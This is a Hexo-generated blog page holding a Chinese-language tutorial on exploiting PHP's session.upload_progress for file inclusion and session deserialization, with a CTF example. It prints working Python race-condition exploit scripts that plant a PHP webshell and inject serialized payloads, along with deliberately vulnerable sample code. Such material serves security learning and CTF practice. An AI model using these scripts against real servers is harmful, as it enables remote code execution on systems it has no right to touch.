@@ -1,0 +1,791 @@
+<!DOCTYPE html>
+<html lang="zh-CN">
+<head>
+    <meta charset="utf-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1, maximum-scale=1">
+    <meta name="keywords" content="Hexo Theme Keep">
+    <meta name="description" content="Hexo Theme Keep">
+    <meta name="author" content="P1taya">
+    
+    <title>
+        
+            session反序列化 |
+        
+        P1taya
+    </title>
+    
+<link rel="stylesheet" href="/css/style.css">
+
+    
+        <link rel="shortcut icon" href="/images/p1taya.jpg">
+    
+    <link rel="stylesheet" href="//cdn.jsdelivr.net/npm/hexo-theme-keep@4.1.1/source/font/css/fontawesome.min.css">
+    <link rel="stylesheet" href="//cdn.jsdelivr.net/npm/hexo-theme-keep@4.1.1/source/font/css/regular.min.css">
+    <link rel="stylesheet" href="//cdn.jsdelivr.net/npm/hexo-theme-keep@4.1.1/source/font/css/solid.min.css">
+    <link rel="stylesheet" href="//cdn.jsdelivr.net/npm/hexo-theme-keep@4.1.1/source/font/css/brands.min.css">
+    
+        
+            
+                
+<link rel="stylesheet" href="/css/demo1.css">
+
+            
+        
+    
+    <script class="keep-theme-configurations">
+    const KEEP = window.KEEP || {}
+    KEEP.hexo_config = {"hostname":"example.com","root":"/","language":"zh-CN","path":"search.json"}
+    KEEP.theme_config = {"base_info":{"primary_color":"#0066cc","title":"P1taya","author":"P1taya","avatar":"/images/p1taya.jpg","logo":"/images/p1taya.jpg","favicon":"/images/p1taya.jpg"},"menu":{"home":"/ || fa-solid fa-home","archives":"/archives || fa-solid fa-box-archive","categories":"/categories || fa-solid fa-layer-group","links":"/links || fa-solid fa-link","about":"/about || fa-solid fa-user-graduate","photos":"/photos || fa-solid fa-image"},"first_screen":{"enable":true,"background_img":"/images/bg.svg","description":"人后的苦尚且还能克服 || 人前的尊严却无比脆弱","hitokoto":false},"social_contact":{"enable":false,"links":{"github":null,"weixin":null,"qq":null,"weibo":null,"zhihu":null,"twitter":null,"x":null,"facebook":null,"email":null}},"scroll":{"progress_bar":false,"percent":false,"hide_header":true},"home":{"announcement":null,"category":true,"tag":true,"post_datetime":"created || fa-solid fa-home","post_datetime_format":"YYYY-MM-DD HH:mm:ss"},"post":{"author_badge":{"enable":true,"level_badge":true,"custom_badge":["One","Two","Three"]},"word_count":{"wordcount":true,"min2read":true},"datetime_format":"YYYY-MM-DD HH:mm:ss","copyright_info":true,"share":false,"reward":{"enable":false,"img_link":null,"text":null}},"code_block":{"tools":{"enable":true,"style":"mac"},"highlight_theme":"obsidian"},"toc":{"enable":true,"number":false,"expand_all":true,"init_open":true,"layout":"right"},"website_count":{"busuanzi_count":{"enable":true,"site_uv":true,"site_pv":true,"page_pv":true}},"local_search":{"enable":true,"preload":false},"comment":{"enable":false,"use":"valine","valine":{"appid":null,"appkey":null,"server_urls":null,"placeholder":null},"gitalk":{"github_id":null,"github_admins":null,"repository":null,"client_id":null,"client_secret":null,"proxy":null},"twikoo":{"env_id":null,"region":null,"version":"1.6.21"},"waline":{"server_url":null,"reaction":false,"version":2},"giscus":{"repo":null,"repo_id":null,"category":"Announcements","category_id":null,"reactions_enabled":false},"artalk":{"server":null},"disqus":{"shortname":null}},"rss":{"enable":false},"lazyload":{"enable":true},"cdn":{"enable":true,"provider":"jsdelivr"},"pjax":{"enable":false},"footer":{"since":2022,"word_count":true},"inject":{"enable":true,"css":["/css/demo1.css"],"js":[null]},"root":"","source_data":{"links":[{"name":"小黄dog","link":"https://wuster.store/","avatar":"https://wuster.store/images/favicon.ico"},{"name":"🐶狗and猫","link":"https://fushuling.com/","avatar":"https://fushuling-1309926051.cos.ap-shanghai.myqcloud.com/avatar.jpg"}]},"version":"4.1.1"}
+    KEEP.language_ago = {"second":"%s 秒前","minute":"%s 分钟前","hour":"%s 小时前","day":"%s 天前","week":"%s 周前","month":"%s 个月前","year":"%s 年前"}
+    KEEP.language_code_block = {"copy":"复制代码","copied":"已复制","fold":"折叠代码块","folded":"已折叠"}
+    KEEP.language_copy_copyright = {"copy":"复制版权信息","copied":"已复制","title":"原文标题","author":"原文作者","link":"原文链接"}
+  </script>
+<meta name="generator" content="Hexo 6.3.0"></head>
+
+
+<body>
+<div class="progress-bar-container">
+    
+
+    
+</div>
+
+
+
+<main class="page-container border-box">
+    <!-- home first screen  -->
+    
+
+    <!-- page content -->
+    <div class="page-main-content border-box">
+        <div class="page-main-content-top">
+            
+<header class="header-wrapper">
+
+    <div class="border-box header-content">
+        <div class="left border-box">
+            
+                <a class="logo-image border-box" href="/">
+                    <img src="/images/p1taya.jpg">
+                </a>
+            
+            <a class="site-name border-box" href="/">
+               P1taya
+            </a>
+        </div>
+
+        <div class="right border-box">
+            <div class="pc">
+                <ul class="menu-list">
+                    
+                        
+                        <li class="menu-item">
+                            <a class=""
+                               href="/"
+                            >
+                                
+                                    <i class="menu-icon fa-solid fa-home"></i>
+                                
+                                首页
+                            </a>
+                        </li>
+                    
+                        
+                        <li class="menu-item">
+                            <a class=""
+                               href="/archives"
+                            >
+                                
+                                    <i class="menu-icon fa-solid fa-box-archive"></i>
+                                
+                                归档
+                            </a>
+                        </li>
+                    
+                        
+                        <li class="menu-item">
+                            <a class=""
+                               href="/categories"
+                            >
+                                
+                                    <i class="menu-icon fa-solid fa-layer-group"></i>
+                                
+                                分类
+                            </a>
+                        </li>
+                    
+                        
+                        <li class="menu-item">
+                            <a class=""
+                               href="/links"
+                            >
+                                
+                                    <i class="menu-icon fa-solid fa-link"></i>
+                                
+                                友链
+                            </a>
+                        </li>
+                    
+                        
+                        <li class="menu-item">
+                            <a class=""
+                               href="/about"
+                            >
+                                
+                                    <i class="menu-icon fa-solid fa-user-graduate"></i>
+                                
+                                关于
+                            </a>
+                        </li>
+                    
+                        
+                        <li class="menu-item">
+                            <a class=""
+                               href="/photos"
+                            >
+                                
+                                    <i class="menu-icon fa-solid fa-image"></i>
+                                
+                                相册
+                            </a>
+                        </li>
+                    
+                    
+                        <li class="menu-item search search-popup-trigger">
+                            <i class="fas search fa-search"></i>
+                        </li>
+                    
+                </ul>
+            </div>
+            <div class="mobile">
+                
+                    <div class="icon-item search search-popup-trigger"><i class="fas fa-search"></i></div>
+                
+                <div class="icon-item menu-bar">
+                    <div class="menu-bar-middle"></div>
+                </div>
+            </div>
+        </div>
+    </div>
+
+    <div class="header-drawer">
+        <ul class="drawer-menu-list">
+            
+                
+                <li class="drawer-menu-item flex-center">
+                    <a class=""
+                       href="/"
+                    >首页</a>
+                </li>
+            
+                
+                <li class="drawer-menu-item flex-center">
+                    <a class=""
+                       href="/archives"
+                    >归档</a>
+                </li>
+            
+                
+                <li class="drawer-menu-item flex-center">
+                    <a class=""
+                       href="/categories"
+                    >分类</a>
+                </li>
+            
+                
+                <li class="drawer-menu-item flex-center">
+                    <a class=""
+                       href="/links"
+                    >友链</a>
+                </li>
+            
+                
+                <li class="drawer-menu-item flex-center">
+                    <a class=""
+                       href="/about"
+                    >关于</a>
+                </li>
+            
+                
+                <li class="drawer-menu-item flex-center">
+                    <a class=""
+                       href="/photos"
+                    >相册</a>
+                </li>
+            
+        </ul>
+    </div>
+
+    <div class="window-mask"></div>
+
+</header>
+
+
+        </div>
+
+        <div class="page-main-content-middle border-box">
+
+            <div class="main-content border-box">
+                
+
+                    
+<div class="fade-in-down-animation">
+    <div class="post-page-container border-box">
+        <div class="post-content-container border-box">
+            
+
+            <div class="post-content-bottom border-box">
+                
+                    <div class="post-title">
+                        session反序列化
+                    </div>
+                
+
+                
+                    <div class="post-header border-box">
+                        
+                            <div class="avatar-box border-box">
+                                <img src="/images/p1taya.jpg">
+                            </div>
+                        
+                        <div class="info-box">
+                            <div class="author border-box">
+                                <span class="name">P1taya</span>
+                                
+                                    <span class="author-badge">Lv4</span>
+                                
+                            </div>
+                            <div class="meta-info border-box">
+                                
+
+<div class="post-meta-info-container border-box post">
+    <div class="post-meta-info border-box">
+        
+
+        
+            <span class="meta-info-item post-create-date">
+                <i class="icon fa-solid fa-calendar-plus"></i>&nbsp;
+                <span class="datetime">2023-02-13 23:31:54</span>
+            </span>
+
+            <span class="meta-info-item post-update-date">
+                <i class="icon fa-solid fa-file-pen"></i>&nbsp;
+                <span class="datetime" data-updated="Thu Apr 25 2024 21:59:56 GMT+0800">2024-04-25 21:59:56</span>
+            </span>
+        
+
+        
+            <span class="meta-info-item post-category border-box"><i class="icon fas fa-folder"></i>&nbsp;
+                <ul class="post-category-ul">
+                    
+                            <li class="category-item"><a href="/categories/%E5%AD%A6%E4%B9%A0/">学习</a></li>
+                        
+                    
+                </ul>
+            </span>
+        
+
+        
+
+        
+        
+            <span class="meta-info-item post-wordcount">
+                <i class="icon fas fa-file-word"></i>&nbsp;<span>2.2k 字</span>
+            </span>
+        
+        
+            <span class="meta-info-item post-min2read">
+                <i class="icon fas fa-clock"></i>&nbsp;<span>10 分钟</span>
+            </span>
+        
+        
+            <span class="meta-info-item post-pv">
+                <i class="icon fas fa-eye"></i>&nbsp;<span id="busuanzi_value_page_pv"></span>
+            </span>
+        
+    </div>
+
+    
+</div>
+
+                            </div>
+                        </div>
+                    </div>
+                
+
+                <div class="post-content keep-markdown-body">
+                    
+
+                    <h2 id="前言"><a href="#前言" class="headerlink" title="前言"></a>前言</h2><p><strong>本文主要是利用PHP中的<code>session.upload_progress</code>功能作为跳板，从而进行文件包含和反序列化漏洞利用。由于首先需要了解关于session及其反序列化等相关的知识，所以对它们先进行介绍。有不对的地方，欢迎各位大佬指正。</strong></p>
+<h2 id="php中的session-upload-progress"><a href="#php中的session-upload-progress" class="headerlink" title="php中的session.upload_progress"></a>php中的session.upload_progress</h2><p>这个功能在php5.4添加的，所以测试的小伙伴，注意下版本哦。</p>
+<p>在php.ini有以下几个默认选项</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">1. session.upload_progress.enabled = on2. session.upload_progress.cleanup = on3. session.upload_progress.prefix = &quot;upload_progress_&quot;4. session.upload_progress.name = &quot;PHP_SESSION_UPLOAD_PROGRESS&quot;5. session.upload_progress.freq = &quot;1%&quot;6. session.upload_progress.min_freq = &quot;1&quot;</span><br></pre></td></tr></table></figure>
+
+<p>其实这里，我们只需要了解前四个配置选项即可，嘿嘿嘿，下面依次讲解。</p>
+<blockquote>
+<p><code>enabled=on</code>表示<code>upload_progress</code>功能开始，也意味着当浏览器向服务器上传一个文件时，php将会把此次文件上传的详细信息(如上传时间、上传进度等)存储在session当中 ；</p>
+<p><code>cleanup=on</code>表示当文件上传结束后，php将会立即清空对应session文件中的内容，这个选项非常重要；</p>
+<p><code>name</code>当它出现在表单中，php将会报告上传进度，最大的好处是，它的值可控；</p>
+<p><code>prefix+name</code>将表示为session中的键名</p>
+</blockquote>
+<h2 id="session相关配置及session反序列化"><a href="#session相关配置及session反序列化" class="headerlink" title="session相关配置及session反序列化"></a>session相关配置及session反序列化</h2><p>因为这个不是本文的重点，所以这里附上几个相关链接。</p>
+<blockquote>
+<p><a class="link"   target="_blank" rel="noopener" href="https://www.cnblogs.com/iamstudy/articles/php_serialize_problem.html" >https://www.cnblogs.com/iamstudy/articles/php_serialize_problem.html<i class="fas fa-external-link-alt"></i></a></p>
+<p><a class="link"   target="_blank" rel="noopener" href="https://blog.spoock.com/2016/10/16/php-serialize-problem/?utm_source=tuicool&utm_medium=referral" >https://blog.spoock.com/2016/10/16/php-serialize-problem/?utm_source&#x3D;tuicool&amp;utm_medium&#x3D;referral<i class="fas fa-external-link-alt"></i></a></p>
+</blockquote>
+<p>另外，再添加个session配置中一个重要选项。</p>
+<p><code>session.use_strict_mode=off</code>这个选项默认值为off，表示我们对Cookie中sessionid可控。这一点至关重要，下面会用到。</p>
+<h2 id="利用session-upload-progress进行文件包含利用"><a href="#利用session-upload-progress进行文件包含利用" class="headerlink" title="利用session.upload_progress进行文件包含利用"></a>利用session.upload_progress进行文件包含利用</h2><h3 id="测试环境"><a href="#测试环境" class="headerlink" title="测试环境"></a>测试环境</h3><blockquote>
+<p>php5.5.38</p>
+<p>win10</p>
+<p>关于session相关的一切配置都是默认值</p>
+</blockquote>
+<h3 id="示例代码"><a href="#示例代码" class="headerlink" title="示例代码"></a>示例代码</h3><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&lt;?php$b=$_GET[&#x27;file&#x27;];include &quot;$b&quot;;?&gt;</span><br></pre></td></tr></table></figure>
+
+<p>可以发现，存在一个文件包含漏洞，但是找不到一个可以包含的恶意文件。其实，我们可以利用<code>session.upload_progress</code>将恶意语句写入session文件，从而包含session文件。前提需要知道session文件的存放位置。</p>
+<h3 id="分析"><a href="#分析" class="headerlink" title="分析"></a>分析</h3><p><strong>问题一</strong></p>
+<p>代码里没有<code>session_start()</code>,如何创建session文件呢。</p>
+<p><strong>解答一</strong></p>
+<p>其实，如果<code>session.auto_start=On</code> ，则PHP在接收请求的时候会自动初始化Session，不再需要执行session_start()。但默认情况下，这个选项都是关闭的。</p>
+<p>但session还有一个默认选项，session.use_strict_mode默认值为0。此时用户是可以自己定义Session ID的。比如，我们在Cookie里设置PHPSESSID&#x3D;TGAO，PHP将会在服务器上创建一个文件：&#x2F;tmp&#x2F;sess_TGAO”。即使此时用户没有初始化Session，PHP也会自动初始化Session。 并产生一个键值，这个键值有ini.get(“session.upload_progress.prefix”)+由我们构造的session.upload_progress.name值组成，最后被写入sess_文件里。</p>
+<p><strong>问题二</strong></p>
+<p>但是问题来了，默认配置<code>session.upload_progress.cleanup = on</code>导致文件上传后，session文件内容立即清空，</p>
+<p><strong>如何进行rce呢？</strong></p>
+<p><strong>解答二</strong></p>
+<p>此时我们可以利用竞争，在session文件内容清空前进行包含利用。</p>
+<h3 id="利用脚本"><a href="#利用脚本" class="headerlink" title="利用脚本"></a>利用脚本</h3><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">#coding=utf-8import ioimport requestsimport threadingsessid = &#x27;TGAO&#x27;data = &#123;&quot;cmd&quot;:&quot;system(&#x27;whoami&#x27;);&quot;&#125;def write(session):    while True:        f = io.BytesIO(b&#x27;a&#x27; * 1024 * 50)        resp = session.post( &#x27;http://127.0.0.1:5555/test56.php&#x27;, data=&#123;&#x27;PHP_SESSION_UPLOAD_PROGRESS&#x27;: &#x27;&lt;?php eval($_POST[&quot;cmd&quot;]);?&gt;&#x27;&#125;, files=&#123;&#x27;file&#x27;: (&#x27;tgao.txt&#x27;,f)&#125;, cookies=&#123;&#x27;PHPSESSID&#x27;: sessid&#125; )def read(session):    while True:        resp = session.post(&#x27;http://127.0.0.1:5555/test56.php?file=session/sess_&#x27;+sessid,data=data)        if &#x27;tgao.txt&#x27; in resp.text:            print(resp.text)            event.clear()        else:            print(&quot;[+++++++++++++]retry&quot;)if __name__==&quot;__main__&quot;:    event=threading.Event()    with requests.session() as session:        for i in xrange(1,30):             threading.Thread(target=write,args=(session,)).start()        for i in xrange(1,30):            threading.Thread(target=read,args=(session,)).start()    event.set()</span><br></pre></td></tr></table></figure>
+
+<p>效果如下图</p>
+<p><img  
+                       lazyload
+                       alt="image"
+                       data-src="https://cdn.jsdelivr.net/gh/R3damancy1/blog-pic/202404252145210.jpeg"
+                        alt="利用session.upload_progress进行文件包含和反序列化渗透"
+                 ></p>
+<h3 id="ctf题目"><a href="#ctf题目" class="headerlink" title="ctf题目"></a>ctf题目</h3><p>在最近，全国大学生信息安全竞赛中有一题justsoso,其中一个页面的代码如下。</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&lt;html&gt;    &lt;?php    error_reporting(0);    $file = $_GET[&quot;file&quot;];    $payload = $_GET[&quot;payload&quot;];    if(!isset($file))&#123;        echo &#x27;Missing parameter&#x27;.&#x27;&lt;br&gt;&#x27;;    &#125;    if(preg_match(&quot;/flag/&quot;,$file))&#123;        die(&#x27;hack attacked!!!&#x27;);    &#125;    @include($file);    if(isset($payload))&#123;        $url = parse_url($_SERVER[&#x27;REQUEST_URI&#x27;]);        parse_str($url[&#x27;query&#x27;],$query);        foreach($query as $value)&#123;            if (preg_match(&quot;/flag/&quot;,$value)) &#123;                die(&#x27;stop hacking!&#x27;);                exit();            &#125;        &#125;        $payload = unserialize($payload);    &#125;else&#123;       echo &quot;Missing parameters&quot;;    &#125;    ?&gt;    &lt;!--Please test index.php?file=xxx.php --&gt;    &lt;!--Please get the source of hint.php--&gt;    &lt;/html&gt;</span><br></pre></td></tr></table></figure>
+
+<p>在代码前几行可以看到，场景和前面的示例代码类似，只不过对变量<code>$file</code>加了过滤，不过没什么影响。</p>
+<p>利用思路一样，这里就不再说了，网上也有相应的解法。</p>
+<h3 id="小结"><a href="#小结" class="headerlink" title="小结"></a>小结</h3><p><strong>利用条件</strong></p>
+<blockquote>
+<p>1. 存在文件包含漏洞</p>
+<p>2. 知道session文件存放路径，可以尝试默认路径</p>
+<p>3. 具有读取和写入session文件的权限</p>
+</blockquote>
+<h2 id="利用session-upload-progress进行反序列化攻击"><a href="#利用session-upload-progress进行反序列化攻击" class="headerlink" title="利用session.upload_progress进行反序列化攻击"></a>利用session.upload_progress进行反序列化攻击</h2><h3 id="测试环境-1"><a href="#测试环境-1" class="headerlink" title="测试环境"></a>测试环境</h3><blockquote>
+<p>php5.5.38</p>
+<p>win10</p>
+<p><code>session.serialize_handler=php_serialize</code>，其余session相关配置为默认值</p>
+</blockquote>
+<h3 id="示例代码-1"><a href="#示例代码-1" class="headerlink" title="示例代码"></a>示例代码</h3><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&lt;?phperror_reporting(0);date_default_timezone_set(&quot;Asia/Shanghai&quot;);ini_set(&#x27;session.serialize_handler&#x27;,&#x27;php&#x27;);session_start();class Door&#123;    public $handle;    function __construct() &#123;        $this-&gt;handle=new TimeNow();    &#125;    function __destruct() &#123;        $this-&gt;handle-&gt;action();    &#125;&#125;class TimeNow &#123;    function action() &#123;        echo &quot;你的访问时间:&quot;.&quot;  &quot;.date(&#x27;Y-m-d H:i:s&#x27;,time());    &#125;&#125;class  IP&#123;    public $ip;    function __construct() &#123;        $this-&gt;ip = &#x27;echo $_SERVER[&quot;REMOTE_ADDR&quot;];&#x27;;    &#125;    function action() &#123;        eval($this-&gt;ip);    &#125;&#125;?&gt;</span><br></pre></td></tr></table></figure>
+
+<h3 id="分析-1"><a href="#分析-1" class="headerlink" title="分析"></a>分析</h3><p><strong>问题一</strong></p>
+<p>整个代码没有参数可控的地方。通过什么方法来进行反序列化利用呢</p>
+<p><strong>解答一</strong></p>
+<p>这里，利用<code>PHP_SESSION_UPLOAD_PROGRESS</code>上传文件，其中利用文件名可控，从而构造恶意序列化语句并写入session文件。</p>
+<p>另外，与文件包含利用一样，也需要进行竞争。</p>
+<h3 id="利用脚本-1"><a href="#利用脚本-1" class="headerlink" title="利用脚本"></a>利用脚本</h3><p>首先利用exp.php脚本构造恶意序列化语句</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&lt;?phpini_set(&#x27;session.serialize_handler&#x27;, &#x27;php_serialize&#x27;);session_start();class Door&#123;    public $handle;    function __construct() &#123;        $this-&gt;handle = new IP();    &#125;    function __destruct() &#123;        $this-&gt;handle-&gt;action();    &#125;&#125;class TimeNow &#123;    function action() &#123;        echo &quot;你的访问时间:&quot;.&quot;  &quot;.date(&#x27;Y-m-d H:i:s&#x27;,time());    &#125;&#125;class  IP&#123;    public $ip;    function __construct() &#123;        //$this-&gt;ip=&#x27;payload&#x27;;        $this-&gt;ip=&#x27;phpinfo();&#x27;;        //$this-&gt;ip=&#x27;print_r(scandir(&#x27;/&#x27;));&#x27;;    &#125;    function action() &#123;        eval($this-&gt;ip);    &#125;&#125;$a=new Door();$b=serialize($a);$c=addslashes($b);$d=str_replace(&quot;O:4:&quot;,&quot;|O:4:&quot;,$c);echo $d;?&gt;</span><br></pre></td></tr></table></figure>
+
+<p>其此利用exp.py脚本进行竞争</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">#coding=utf-8import requestsimport threadingimport ioimport sysdef exp(ip,port):        f = io.BytesIO(b&#x27;a&#x27; * 1024 *1024*1)    while True:        et.wait()        url = &#x27;http://&#x27;+ip+&#x27;:&#x27;+str(port)+&#x27;/test5.php&#x27;        headers = &#123;        &#x27;User-Agent&#x27;: &#x27;Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/62.0.3202.94 Safari/537.36&#x27;,        &#x27;Accept&#x27;: &#x27;text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8&#x27;,        &#x27;Accept-Language&#x27;: &#x27;zh-CN,zh;q=0.8,en-US;q=0.5,en;q=0.3&#x27;,        &#x27;DNT&#x27;: &#x27;1&#x27;,        &#x27;Cookie&#x27;: &#x27;PHPSESSID=20190506&#x27;,        &#x27;Connection&#x27;: &#x27;close&#x27;,        &#x27;Upgrade-Insecure-Requests&#x27;: &#x27;1&#x27;        &#125;        proxy = &#123;        &#x27;http&#x27;: &#x27;127.0.0.1:8080&#x27;        &#125;        data=&#123;&#x27;PHP_SESSION_UPLOAD_PROGRESS&#x27;:&#x27;123&#x27;&#125;        files=&#123;            &#x27;file&#x27;:(r&#x27;|O:4:\&quot;Door\&quot;:1:&#123;s:6:\&quot;handle\&quot;;O:2:\&quot;IP\&quot;:1:&#123;s:2:\&quot;ip\&quot;;s:10:\&quot;phpinfo();\&quot;;&#125;&#125;&#x27;,f,&#x27;text/plain&#x27;)        &#125;        resp = requests.post(url,headers=headers,data=data,files=files,proxies=proxy) #,proxies=proxy        resp.encoding=&quot;utf-8&quot;        if len(resp.text)&lt;2000:            print(&#x27;[+++++]retry&#x27;)        else:            print(resp.content.decode(&#x27;utf-8&#x27;).encode(&#x27;utf-8&#x27;))            et.clear()            print(&#x27;success!&#x27;)            if __name__ == &quot;__main__&quot;:    ip=sys.argv[1]    port=int(sys.argv[2])    et=threading.Event()    for i in xrange(1,40):        threading.Thread(target=exp,args=(ip,port)).start()    et.set()</span><br></pre></td></tr></table></figure>
+
+<p>首先在代码里加个代理，利用burp抓包。如下图</p>
+<p><img  
+                       lazyload
+                       alt="image"
+                       data-src="https://image.3001.net/images/20190506/1557146875_5cd02cfb01b9e.png!small"
+                        alt="利用session.upload_progress进行文件包含和反序列化渗透"
+                 ></p>
+<p>这里有几个注意点：</p>
+<blockquote>
+<p>PHPSESSID必须要有，因为要竞争同一个文件</p>
+<p>filename可控，但是在值的最前面加上<code>|</code>,因为最终目的是利用session的反序列化，<code>PHP_SESSION_UPLOAD_PROGRESS</code>只是个跳板。其次把字符串中的双引号转义，以防止与最外层的双引号冲突</p>
+<p>上传的文件要大些，否则很难竞争成功。我写入是这么大<code>f = io.BytesIO(b&#39;a&#39; * 1024 *1024*1)</code></p>
+<p>filename值中出现汉字时，会出错，所以在利用脚本前，<a class="link"   target="_blank" rel="noopener" href="https://blog.csdn.net/iriszx999/article/details/82113521" >一定要修改python源码<i class="fas fa-external-link-alt"></i></a></p>
+</blockquote>
+<p>最后把<code>exp.py</code>中的代理去掉，直接跑<code>exp.py</code>,效果如下。</p>
+<p><img  
+                       lazyload
+                       alt="image"
+                       data-src="https://cdn.jsdelivr.net/gh/R3damancy1/blog-pic/202404252145729.jpeg"
+                        alt="利用session.upload_progress进行文件包含和反序列化渗透"
+                 ></p>
+<h3 id="几次失败尝试"><a href="#几次失败尝试" class="headerlink" title="几次失败尝试"></a>几次失败尝试</h3><blockquote>
+<p>其实，利用burp抓到<code>exp.py</code>流量后，可以直接在burp爆破，但貌似数据包数据有点多，导致burp反应很慢，最终失败。</p>
+<p>另外，我尝试伪造<code>PHP_SESSION_UPLOAD_PROGRESS</code>的值，但是值中一旦出现<code>|</code>，将会导致数据写入session文件失败。</p>
+</blockquote>
+<h3 id="小结-1"><a href="#小结-1" class="headerlink" title="小结"></a>小结</h3><p>利用条件主要是存在session反序列化漏洞。</p>
+<p>从文件包含和反序列化两个利用点，可以发现，利用<code>PHP_SESSION_UPLOAD_PROGRESS</code>可以绕过大部分过滤，而且传输的数据也不易发现。</p>
+
+                </div>
+                
+                        
+<div class="post-copyright-info-container border-box">
+    <div class="copyright-info-content border-box">
+        <div class="copyright-info-top border-box">
+            <div class="copyright-post-title border-box text-ellipsis">
+                session反序列化
+            </div>
+
+            <div class="copyright-post-link border-box text-ellipsis">
+                2023/02/13/利用session.upload_progress进行文件包含和反序列化渗透 /
+            </div>
+        </div>
+
+        <div class="copyright-info-bottom border-box">
+            <div class="copyright-post-author bottom-item">
+                <div class="type">
+                    作者
+                </div>
+                <div class="content">P1taya</div>
+            </div>
+
+            <div class="post-time bottom-item">
+                <div class="type">
+                    发布于
+                </div>
+                <div class="content">2023-02-13 23:31</div>
+            </div>
+
+
+            <div class="post-license bottom-item">
+                <div class="type">
+                    许可
+                </div>
+                <div class="content tooltip" data-tooltip-content="CC BY-NC-SA 4.0">
+                    <a href="https://creativecommons.org/licenses/by-nc-sa/4.0/deed.zh-hans" target="_blank">
+                        
+                            <i class="fa-brands fa-creative-commons"></i>
+                            <i class="fa-brands fa-creative-commons-by"></i>
+                            <i class="fa-brands fa-creative-commons-nc"></i>
+                            <i class="fa-brands fa-creative-commons-sa"></i>
+                        
+                    </a>
+                </div>
+            </div>
+        </div>
+
+        <i class="copyright-bg fa-solid fa-copyright"></i>
+    </div>
+    <div class="copy-copyright-info flex-center tooltip" data-tooltip-content="复制版权信息" data-tooltip-offset-y="-2px">
+        <i class="fa-solid fa-copy"></i>
+    </div>
+</div>
+
+                
+
+                <div class="post-bottom-tags-and-share border-box">
+                    <div>
+                        
+                    </div>
+                    <div>
+                        
+                    </div>
+                </div>
+
+                
+
+                
+                    <div class="post-nav border-box">
+                        
+                            <div class="prev-post">
+                                <a class="prev"
+                                   rel="prev"
+                                   href="/2023/03/12/NET/"
+                                   title=".NET复习"
+                                >
+                                    <span class="left arrow-icon flex-center">
+                                        <i class="fas fa-chevron-left"></i>
+                                    </span>
+                                    <span class="title flex-center">
+                                        <span class="post-nav-title-item text-ellipsis">.NET复习</span>
+                                        <span class="post-nav-item">上一篇</span>
+                                    </span>
+                                </a>
+                            </div>
+                        
+                        
+                            <div class="next-post">
+                                <a class="next"
+                                   rel="next"
+                                   href="/2022/11/13/thinkphp6%E4%BB%BB%E6%84%8F%E6%96%87%E4%BB%B6%E5%86%99%E5%85%A5%E6%BC%8F%E6%B4%9E%E5%A4%8D%E7%8E%B0%E8%BF%87%E7%A8%8B/"
+                                   title="thinkphp6任意文件写入"
+                                >
+                                    <span class="title flex-center">
+                                        <span class="post-nav-title-item text-ellipsis">thinkphp6任意文件写入</span>
+                                        <span class="post-nav-item">下一篇</span>
+                                    </span>
+                                    <span class="right arrow-icon flex-center">
+                                        <i class="fas fa-chevron-right"></i>
+                                    </span>
+                                </a>
+                            </div>
+                        
+                    </div>
+                
+
+                
+                    
+
+
+
+
+
+
+                
+            </div>
+        </div>
+
+        
+            <div class="pc-post-toc right-toc">
+                <div class="post-toc-wrap border-box">
+    <div class="post-toc border-box">
+        <ol class="nav"><li class="nav-item nav-level-2"><a class="nav-link" href="#%E5%89%8D%E8%A8%80"><span class="nav-text">前言</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#php%E4%B8%AD%E7%9A%84session-upload-progress"><span class="nav-text">php中的session.upload_progress</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#session%E7%9B%B8%E5%85%B3%E9%85%8D%E7%BD%AE%E5%8F%8Asession%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96"><span class="nav-text">session相关配置及session反序列化</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#%E5%88%A9%E7%94%A8session-upload-progress%E8%BF%9B%E8%A1%8C%E6%96%87%E4%BB%B6%E5%8C%85%E5%90%AB%E5%88%A9%E7%94%A8"><span class="nav-text">利用session.upload_progress进行文件包含利用</span></a><ol class="nav-child"><li class="nav-item nav-level-3"><a class="nav-link" href="#%E6%B5%8B%E8%AF%95%E7%8E%AF%E5%A2%83"><span class="nav-text">测试环境</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#%E7%A4%BA%E4%BE%8B%E4%BB%A3%E7%A0%81"><span class="nav-text">示例代码</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#%E5%88%86%E6%9E%90"><span class="nav-text">分析</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#%E5%88%A9%E7%94%A8%E8%84%9A%E6%9C%AC"><span class="nav-text">利用脚本</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#ctf%E9%A2%98%E7%9B%AE"><span class="nav-text">ctf题目</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#%E5%B0%8F%E7%BB%93"><span class="nav-text">小结</span></a></li></ol></li><li class="nav-item nav-level-2"><a class="nav-link" href="#%E5%88%A9%E7%94%A8session-upload-progress%E8%BF%9B%E8%A1%8C%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E6%94%BB%E5%87%BB"><span class="nav-text">利用session.upload_progress进行反序列化攻击</span></a><ol class="nav-child"><li class="nav-item nav-level-3"><a class="nav-link" href="#%E6%B5%8B%E8%AF%95%E7%8E%AF%E5%A2%83-1"><span class="nav-text">测试环境</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#%E7%A4%BA%E4%BE%8B%E4%BB%A3%E7%A0%81-1"><span 